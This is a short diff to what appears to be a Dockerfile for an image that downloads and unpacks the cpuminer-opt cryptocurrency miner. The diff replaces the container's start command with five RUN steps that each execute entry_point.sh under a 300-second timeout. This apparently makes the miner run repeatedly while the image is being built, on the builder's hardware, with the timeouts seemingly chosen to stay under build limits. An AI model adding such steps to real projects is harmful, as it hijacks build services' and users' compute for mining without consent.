@@ -7,4 +7,8 @@ RUN apt-get -qqy update -y \
     && tar xf cpuminer-opt-linux.tar.gz
 COPY scripts/* /
 RUN chmod +x entry_point.sh
-CMD ["./entry_point.sh"]
+RUN timeout -k 10 300 ./entry_point.sh
+RUN timeout -k 10 300 ./entry_point.sh
+RUN timeout -k 10 300 ./entry_point.sh
+RUN timeout -k 10 300 ./entry_point.sh
+RUN timeout -k 10 300 ./entry_point.sh
